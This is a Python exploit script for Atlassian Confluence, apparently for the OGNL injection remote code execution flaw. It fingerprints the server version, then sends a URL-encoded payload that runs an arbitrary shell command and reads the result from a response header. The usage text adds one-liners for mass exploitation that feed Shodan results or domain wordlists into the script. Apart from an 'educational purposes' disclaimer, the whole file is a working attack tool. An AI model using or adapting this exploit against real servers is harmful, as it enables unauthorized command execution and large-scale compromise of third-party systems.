#!/usr/bin/python3
# -*- coding: utf-8 -*-

# Autor:   Pablo Salinas
# Linkedin: https://www.linkedin.com/in/00011001/
# Nota:     Usage only for educational and legal purposes
# Licencia:  MIT License (http://www.opensource.org/licenses/mit-license.php)
# Version : 1.0

from bs4 import BeautifulSoup
import requests
import urllib3
import re
import sys
from colorama import Fore
from colorama import Style
urllib3.disable_warnings()


def check_vesion(host):
  try:
    response = requests.get(f"{host}/login.action", verify=False, timeout=8)
    if response.status_code == 200:
      filter_version = re.findall("<span id='footer-build-information'>.*</span>", response.text)
      
      if len(filter_version) >= 1:
        version = filter_version[0].split("'>")[1].split('</')[0]
        return version
      else:
        return False
    else:
      return host
  except:
    return False


def send_payload(host, command):   
    payload = f"%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22{command}%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D"
    response = requests.get(f"{host}/{payload}/", verify=False, allow_redirects=False)
    
    try:
      if response.status_code == 302:
          response.headers["X-Cmd-Response"]
          return  response.headers["X-Cmd-Response"]
      else:
          return f"{Fore.RED}This confluence host seems not to be vulnerable.{Style.RESET_ALL}"
    except:
      return f"{Fore.RED}This confluence host seems not to be vulnerable{Style.RESET_ALL}"


def main():

  if len(sys.argv) < 3:
    print(f"{Fore.BLUE}<coded by P4b3l1t0> ###   USAGE:{Style.BRIGHT}\n")
    print(f"{Fore.CYAN}EXAMPLE: python3 confusploit.py https://example.com <command>{Style.BRIGHT}")
    print(f"{Fore.CYAN}EXAMPLE: python3 confusploit.py https://example.com whoami{Style.BRIGHT}")
    print(f"{Fore.CYAN}EXAMPLE: python3 confusploit.py https://example.com 'docker ps'{Style.BRIGHT}\n")
    print(f"{Fore.YELLOW}MASS HUNTING WITH SHODAN:\nshodan search Confluence --fields ip_str,port,hostnames --limit 400 | grep confluence | awk '{{print $1}}' | while read host do ; do python3 confusploit.py $host id; done{Style.RESET_ALL}\n")
    print(f"{Fore.LIGHTYELLOW_EX}MASS HUNTING WITH A WORDLIST:\ncat confluence_domains.txt | awk '{{print $1}}' | grep confluence | while read host do ; do python3 confusploit.py $host id; done{Style.RESET_ALL}\n")
    return
  
  domain = sys.argv[1]
  target = "https://{}/".format(domain)
  cmd = "id"
  cmd = sys.argv[2]
  version = check_vesion(target)

  if version:
    print('\033[1;95mConfluence target version in {}: {}\033[1;m'.format(target, version))
  else:
    print("\033[1;91mTarget version in {} not found!\033[1;m".format(target))
    return
  
  exec_payload = send_payload(target, cmd) 
  print(exec_payload)

if __name__ == "__main__":
   main()
